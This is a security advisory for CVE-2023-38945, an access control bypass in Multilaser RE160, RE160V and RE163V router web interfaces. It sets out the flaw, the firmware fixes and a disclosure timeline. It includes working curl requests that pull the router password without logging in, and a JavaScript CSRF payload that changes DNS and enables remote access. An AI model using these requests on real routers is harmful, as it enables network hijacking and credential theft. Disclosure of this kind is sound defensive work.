@@ -1,0 +1,180 @@
+id: 39416
+date: 03/05/2024
+title: Multilaser RE160V / RE160 URL Manipulation Access Bypass Vulnerability
+author: Vinicius Moraes
+cves: CVE-2023-38945
+
+=====[Tempest Security Intelligence - Security Advisory -
+CVE-2023-38945]=======
+
+  Access Control Bypass in Multilaser routers' Web Management Interface
+
+  Author: Vinicius Moraes  < vinicius.moraes.w () gmail com >
+
+=====[Table of
+Contents]========================================================
+
+1. Overview
+2. Detailed description
+3. Other contexts & solutions
+4. Acknowledgements
+5. Timeline
+6. References
+
+=====[1.
+Overview]==============================================================
+
+* Systems affected: Multilaser RE160 web interface -
+V5.07.51_pt_MTL01(verified)
+                                                   -
+V5.07.52_pt_MTL01(verified)
+                                        (other routers/versions may be
+affected)
+                    Multilaser RE160V web interface - V12.03.01.08_pt
+(verified)
+                                                    - V12.03.01.09_pt
+(verified)
+                                        (other routers/versions may be
+affected)
+                    Multilaser RE163V web interface - V12.03.01.08_pt
+(verified)
+                                        (other routers/versions may be
+affected)
+* Release date: 28/02/2024
+* CVSS score: 7.7 / High
+* CVSS vector:
+CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
+* Impact: This vulnerability allows attackers to bypass the access control
+of
+          the routers' web interface and perform management actions, such as
+          changing the DNS settings, enabling router remote access,
+changing the
+          IP routing table, and retrieving the WiFi and management
+application
+          passwords. A noteworthy aspect also regards the fact that the
+attack
+          can be conducted remotely.
+
+=====[2. Detailed
+description]==================================================
+
+The affected Multilaser routers have a web management interface designed to
+graphically assist users in configuring features and diagnosing problems.
+However, there is a bug in its access control mechanism that allows
+unauthenticated users to access routers' management features.
+
+In order to exploit this bug, it is necessary to add a specific extension
+at the
+end of the URLs. Some acceptable extension values are: js, css, png, jpg,
+gif,
+jsp. The following example shows how an unauthenticated user (not bearing a
+credential or session token) could perform it by using the curl tool[1] to
+retrieve, for example, a backup of the RE160 router config, which contains
+its
+web interface password:
+
+[snippet]
+
+$ # traditional unauthenticated request being redirected to the login page
+$ curl -is [routerIpAddress]/cgi-bin/DownloadCfg/C.cfg | grep -E
+'HTTP/|Locatio'
+HTTP/1.0 302 Redirect
+Location: http://[routerIpAddress]/login.asp
+$
+$ # malicious unauthenticated request getting the web interface password
+$ # (in this example: "pass123")
+$ curl -is [routerIpAddress]/cgi-bin/DownloadCfg/.js | grep -E
+'HTTP/|http_pass'
+HTTP/1.0 200 OK
+http_passwd=pass123
+
+[/snippet]
+
+Furthermore, the next example presents part of a JavaScript code that could
+be
+added to a malicious website with the purpose of changing the router's DNS
+address and enabling remote access on vulnerable RE160V and RE163V routers.
+This can be achieved by exploiting this access control issue and a CSRF[3]:
+
+[code]
+
+fetch('http://[routerIpAddress]/goform/setSysTools/.js', {
+    'method': 'POST',
+    'mode': 'no-cors',
+    'headers': {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    'body':
+'module2=wanAdvCfg&module3=lanCfg&lanDns1=[newDnsAddress]&lanDns2=&
+    module4=remoteWeb&remoteWebEn=true&remoteWebType=any&remoteWebPort=8080'
+})
+
+[/code]
+
+By performing the aforementioned steps, an attacker can gain access to all
+features of the web interface.
+
+This vulnerability can be exploited remotely via a malicious website or a
+mobile/desktop application performing HTTP requests against the router. And
+also locally, by connecting to a vulnerable router (such as through the
+wireless
+infrastructure of a coffee shop or airport).
+
+=====[3. Other contexts &
+solutions]============================================
+
+Conceptually, in order to fix this issue, the server receiving the request
+must
+always validate the session token in authenticated features as a
+prerequisite
+for enforcing access control, regardless of any extension in the URL. Upon
+not
+receiving a valid session token within the request, users should be
+redirected
+to the login page.
+
+Practically, to mitigate this issue, the RE160V should be updated to
+firmware
+V12.03.01.12 or newer[4], the RE163V to firmware V12.03.01.10 or newer[5].
+Multilaser informed that they contacted the firmware vendor of the model
+RE160,
+but due to the age of the equipment and its limitations, it will not
+receive an
+update to fix the issue. Therefore, it is recommended to replace the RE160
+router with a new one that has received the fix (such as RE160V or RE163V).
+
+=====[4.
+Acknowledgements]======================================================
+
+  Joaquim Brasil de Oliveira  < palulabrasil () gmail com >
+                              < twitter.com/palulabr >
+  Tempest Security Intelligence[2]
+
+=====[5.
+Timeline]==============================================================
+
+13/02/2023 - The latest available firmware for model RE163V (V12.03.01.10)
+fixed
+the bug;
+28/04/2023 - The bug regarding model RE160V was reported to the vendor;
+29/06/2023 - A new contact was made with the company;
+29/06/2023 - Vendor shared a firmware update (V12.03.01.09) for RE160V;
+07/07/2023 - The same bug in model RE160 was reported to the vendor;
+16/10/2023 - Vendor shared a new firmware for RE160V (V12.03.01.12) where
+the
+bug was fixed;
+26/10/2023 - Vendor informed that RE160 will not receive a fix;
+26/10/2023 - Vendor released the RE160V update on its website[4].
+
+=====[6.
+References]============================================================
+
+  [1] https://curl.se
+  [2] https://tempest.com.br
+  [3] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31152
+  [4]
+https://suporte.multilaser.com.br/produtos/rot-300mbps-ipv6-2-4-ghz-2-ant-re160v
+  [5]
+https://suporte.multilaser.com.br/produtos/rot-300mbps-ipv6-2-4-ghz-3-ant-re163v
+
+#  0day.today [2024-03-06]  #
